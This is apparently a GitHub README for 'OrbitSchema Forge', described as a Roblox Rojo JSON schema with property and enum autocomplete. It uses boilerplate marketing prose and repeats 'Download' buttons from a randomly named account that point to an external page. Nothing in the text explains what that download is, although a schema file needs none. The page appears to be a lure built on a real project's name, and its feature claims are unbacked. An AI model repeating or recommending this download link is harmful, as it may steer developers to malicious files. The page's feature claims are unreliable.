![preview](https://raw.githubusercontent.com/m42703144-afk/rojo-schema-forge/main/thumb_b6c222.svg)
[![Download](https://raw.githubusercontent.com/m42703144-afk/rojo-schema-forge/main/run_95b69d.svg)](https://m42703144-afk.github.io/rojo-schema-forge/)

# 🌌 OrbitSchema Forge — Declarative Roblox Project Intelligence

[![License: MIT](https://img.shields.io/badge/License-MIT-3da639.svg)](https://opensource.org/licenses/MIT)
[![Status](https://img.shields.io/badge/status-actively%20maintained-4c8bf5.svg)](#)
[![Made for Rojo](https://img.shields.io/badge/ecosystem-Rojo-ff7043.svg)](#)
[![Autocomplete](https://img.shields.io/badge/autocomplete-property%20%2B%20enum-8e44ad.svg)](#)
[![Schema Version](https://img.shields.io/badge/schema%20rev-2026.1-00bcd4.svg)](#)
[![Editor Support](https://img.shields.io/badge/editors-VS%20Code%20%7C%20Neovim%20%7C%20Zed-1abc9c.svg)](#)
[![Language](https://img.shields.io/badge/spec-JSON%20Schema%20Draft%202020--12-f1c40f.svg)](#)
[![PRs Welcome](https://img.shields.io/badge/contributions-welcome-e67e22.svg)](#)

A next-generation companion schema layer for Rojo projects, built around a single philosophy: **your project tree should describe itself**. OrbitSchema Forge takes the humble Rojo JSON schema and reimagines it as an intelligent, self-possessed knowledge base — one that knows every Roblox property, every enum, every instance class, and how they all nest together. Instead of hunting through documentation tabs, your editor quietly finishes the thought for you, like a well-trained studio assistant who has memorized the entire API surface.

This repository is the spiritual successor and conceptual evolution of the *better-rojo-schema* idea — a Rojo schema with Roblox property and enum autocomplete — but expanded into a multi-layered, editor-agnostic, continuously-updated schema platform. If the original was a pocket dictionary, OrbitSchema Forge is the whole library with a librarian attached.

[![Download](https://raw.githubusercontent.com/m42703144-afk/rojo-schema-forge/main/run_95b69d.svg)](https://m42703144-afk.github.io/rojo-schema-forge/)

---

## 🧭 Table of Contents

- [What Is OrbitSchema Forge?](#-what-is-orbitschema-forge)
- [Why Another Schema?](#-why-another-schema)
- [Core Feature Matrix](#-core-feature-matrix)
- [Roblox Property Intelligence](#-roblox-property-intelligence)
- [Enum Completion Engine](#-enum-completion-engine)
- [Editor Integrations](#-editor-integrations)
- [Responsive Interface Layer](#-responsive-interface-layer)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Schema Composition Model](#-schema-composition-model)
- [Architecture Overview](#-architecture-overview)
- [Configuration Reference](#-configuration-reference)
- [Workflow Recipes](#-workflow-recipes)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contribution Guidelines](#-contribution-guidelines)
- [Community & Support](#-community--support)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🛰️ What Is OrbitSchema Forge?

OrbitSchema Forge is a **declarative project intelligence layer** for Rojo. It pairs JSON Schema definitions with Roblox-aware completion metadata so that when you write a `*.project.json` file, `default.project.json`, or any schema-bound fragment, your editor offers meaningful, class-aware suggestions.

Think of it as the difference between writing a letter with a blank notepad versus writing it with a co-pilot who already knows the recipient's language, dialect, and hobbies. The schema doesn't just validate — it *suggests*, *explains*, and *guides*.

Key idea: rather than treating Roblox properties and enums as an external data source that you look up elsewhere, OrbitSchema Forge embeds them into the schema tree so completion happens inline, at the point of authorship.

---

## 💡 Why Another Schema?

Rojo is wonderful. It is the connective tissue of modern Roblox development workflows. But out of the box, a project file is a bit of a blank canvas — powerful, yet silent. Most developers learn Rojo's keys through repetition, tribal knowledge, or documentation dives.

OrbitSchema Forge answers a simple question: *what if the schema itself taught you as you typed?*

The result is a repository that behaves less like a static artifact and more like a living reference. Every property hints at its type. Every enum hints at its legal values. Every nested table hints at what belongs inside it. It is the sort of thing that turns a two-hour onboarding into a two-minute "oh, I get it now."

---

## 🧩 Core Feature Matrix

| Capability | Description | Maturity |
| --- | --- | --- |
| Property Autocomplete | Every Roblox instance class exposes its property set in-editor | Stable |
| Enum Suggestions | Enum items surface as you write `Enum.` or `EnumItem` values | Stable |
| Class Inheritance Mapping | Subclass awareness so shared properties bubble down correctly | Stable |
| Nested Project Tables | Deep suggestion support for `$path`, `$className`, `$properties`, and siblings | Stable |
| Multi-Editor Delivery | The same schema powers VS Code, Neovim, and Zed | Stable |
| Localization Layer | Descriptions available in multiple languages | Beta |
| Inverse Lookup Tooling | Find which class declares a given property | Preview |
| Schema Fragmentation | Compose schemas from smaller reusable fragments | Beta |
| Snapshot Pipeline | Versioned API snapshots per Roblox release channel | Stable |

---

## 🔍 Roblox Property Intelligence

Every schema node carries metadata describing:

- The property's canonical name
- The expected data type
- Whether it is optional or required
- The instance class(es) that own it
- Human-readable notes when the property has quirks

When you nest a `$properties` table inside a Part-classed node, the schema understands that only Part-relevant properties apply. Nest it inside a `MeshPart`, and the property surface shifts. This is *context-sensitive* completion — a subtle but transformative quality-of-life upgrade.

---

## 🎨 Enum Completion Engine

Enums in Roblox are deceptively sprawling. There are dozens of them, each with items and each with their own naming cadence. OrbitSchema Forge exposes the full `Enum.X.Y` surface through schema `enum` and `const` declarations where appropriate, so:

- Typing `Enum.Material.` fans out into every material option.
- Enums used as property values are validated strictly.
- Deprecated enum items are flagged so you avoid future-broken code.

---

## 🖥️ Editor Integrations

OrbitSchema Forge is deliberately editor-agnostic. Because the schema is plain JSON Schema, any editor or tool that speaks the spec can consume it. Notable integrations include:

- **VS Code** through the Red Hat YAML extension or a native JSON Schema mapping
- **Neovim** through `lua-language-server` and `jsonls` configured against the schema URL
- **Zed** via its built-in JSON schema recognition
- **JetBrains IDEs** through the JSON Schema plugin
- **Language servers and CLI validators** via a plain file path reference

No editor is a second-class citizen here. OrbitSchema Forge treats them all as equal participants in a shared contract.

---

## 📱 Responsive Interface Layer

Wait — a schema with a *responsive interface*? Yes. OrbitSchema Forge ships with a companion documentation page and preview web view that adapts gracefully to any viewport. Whether you're glancing at the class reference on a phone during a commute or reading it on a triple-monitor battlestation, the interface reflows cleanly. Responsive design is treated as a first-class requirement, not an afterthought.

The interface layer includes:

- Fluid grid for class and enum references
- Collapsible nested sections for deep property hierarchies
- Dark and light themes that respect OS preferences
- Keyboard-first navigation for no-mouse workflows

---

## 🌍 Multilingual Support

Autocomplete descriptions and inline documentation are available in more than one language. Localization files live in a dedicated directory and are loaded based on the editor's locale hint or an explicit configuration toggle.

Supported description locales (partial list):

- English
- Spanish
- French
- German
- Portuguese (Brazil)
- Japanese
- Korean
- Simplified Chinese

Adding a locale is intentionally low-friction: drop a translation file, run the build, and it slots in. This is a project that believes Roblox creators are a global audience and deserves a schema that speaks their language.

---

## 🕰️ Round-the-Clock Assistance

Schema authors drift, APIs update, and questions arise at inconvenient hours. This project commits to **continuous availability of guidance** — not in the sense of a human operator on standby, but in the sense that the repository keeps itself useful around the clock:

- Discussion threads are triaged daily.
- Issue templates guide reporters toward actionable reports.
- A documentation index answers the most common requests immediately.
- Snapshot releases ship on a predictable cadence aligned with Roblox release channels.

If you're working at 3 a.m., the schema doesn't sleep.

---

## 🧬 Schema Composition Model

Rather than one monolithic file, OrbitSchema Forge composes from fragments:

- **Class fragments** for each Roblox instance type
- **Enum fragments** for each enumerated value set
- **Meta fragments** for the top-level project structure
- **Localization fragments** for descriptions

The build step merges these into a single distributable schema, keeping source files small, reviewable, and easy to update. Contributors do not need to understand the entire surface to make a meaningful change — just the fragment they are editing.

---

## 🏗️ Architecture Overview

A pulse-check of the repo layout, described in prose rather than raw trees, since this README optimizes for readability:

- A `schema/` area holds source fragments.
- A `dist/` area holds merged outputs, keyed by schema revision.
- A `tools/` area houses build scripts, snapshot fetchers, and validation utilities.
- A `docs/` area renders the human-facing reference site.
- A `locales/` area stores translation files.
- A `tests/` area verifies that fragments obey the meta-schema and that merged outputs validate known-good examples.

The build pipeline runs on every pull request, so regressions are caught before merge. Freshness is non-negotiable: schemas that drift are schemas that disappoint.

---

## ⚙️ Configuration Reference

Configuration lives in a small descriptor at the project root. Notable knobs:

- `schemaRevision` — pins to a specific dated schema snapshot
- `locale` — selects description language
- `strictEnums` — turns unknown enum values into errors rather than warnings
- `includeDeprecated` — toggles inclusion of deprecated properties in suggestions
- `editorHints` — enables editor-specific annotations such as `markdownDescription`

Each option has a sensible default. You can adopt OrbitSchema Forge without touching a single line of configuration, and tune later as your workflow matures.

---

## 🧪 Workflow Recipes

**Recipe 1 — New project from scratch.** Add a schema reference at the top of your project file. Autocomplete begins immediately for top-level keys.

**Recipe 2 — Migrating a legacy project.** Link the schema, then walk through warnings. Each warning points at the property or enum that needs attention.

**Recipe 3 — Teaching a team.** Pair the schema with the companion docs page so junior developers get suggestions and explanations simultaneously.

**Recipe 4 — CI validation.** Run the schema validator in your pipeline so malformed project files fail fast, before they reach collaborators.

---

## 🔭 SEO & Discoverability Notes

This repository is discoverable under natural search phrases such as *Roblox Rojo schema*, *Roblox property autocomplete*, *Roblox enum completion*, *Rojo project JSON schema*, and *Rojo editor tooling*. Rather than stuffing keywords into every line, the README weaves them into meaningful sentences so that search engines and human readers arrive at the same destination: clarity.

Consistent terminology and structured headings also help documentation crawlers build a clean index, which in turn helps developers find solutions faster.

---

## 🗺️ Roadmap for 2026

- Q1 2026 — Expand localization to five additional languages
- Q2 2026 — Ship an experimental schema diff tool
- Q3 2026 — Introduce class-relationship visualizer in the docs site
- Q4 2026 — Release a stable versioned schema cadence aligned with Roblox releases

Roadmap items are aspirational and may shift as the ecosystem evolves. Contributions toward any of these milestones are warmly welcomed.

---

## 🤝 Contribution Guidelines

Contributions of all sizes are welcome — from typo fixes in descriptions to entirely new locale files. Before opening a pull request:

- Run the local validator to catch schema regressions early.
- Keep fragment changes scoped and well-commented.
- Include a short rationale in the PR description.
- For new locales, mirror the structure of an existing locale file.

A friendly, curious tone is expected in discussions. This project exists because a community decided to make Rojo projects a little smarter, and that spirit is worth preserving.

---

## 📣 Community & Support

Questions, ideas, and feature requests are all welcome through the repository's discussion area. If you spot a missing property or an enum that has drifted out of sync with the current Roblox API, an issue is the fastest path to a fix. Maintainers aim to respond promptly and courteously, and contributors are encouraged to help one another whenever possible.

---

## ⚠️ Disclaimer

This project is an independent, community-maintained companion to Rojo and is not affiliated with, endorsed by, or sponsored by Rojo's maintainers or by Roblox Corporation. Roblox APIs evolve, and while every effort is made to keep schema snapshots current, there may be a brief lag between an official API change and a corresponding schema update. Always verify behavior against official documentation when precision is essential. The schema is provided as an authoring aid, not as a substitute for testing in a real environment.

---

## 📄 License

Released under the [MIT License](https://opensource.org/licenses/MIT). You are welcome to use, modify, and redistribute this project in accordance with the license terms. See the license link for full details.

---

[![Download](https://raw.githubusercontent.com/m42703144-afk/rojo-schema-forge/main/run_95b69d.svg)](https://m42703144-afk.github.io/rojo-schema-forge/)